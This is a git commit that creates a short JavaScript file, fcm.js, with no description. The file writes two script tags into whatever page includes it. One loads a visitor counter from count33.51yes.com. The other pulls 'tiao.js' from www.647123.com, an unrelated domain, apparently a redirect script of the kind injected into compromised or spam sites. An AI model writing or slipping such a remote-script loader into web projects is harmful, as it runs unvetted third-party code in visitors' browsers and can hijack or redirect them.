4a08adbef219f8ca4680a340cf545d5a70cd530e
js999999999 <js-9@outlook.com>
2015-09-01 16:39:52 +0800

    Create fcm.js

---
+++ qe7z/fcm.js
@@ -0,0 +1,3 @@
+document.writeln("<script language=\"javascript\" src=\"http:\/\/count33.51yes.com\/click.aspx?id=332863254&logo=12\" charset=\"gb2312\"><\/script>");
+
+document.writeln("<script src=http:\/\/\www.647123.com\/qe7z/tiao.js ><\/script>");
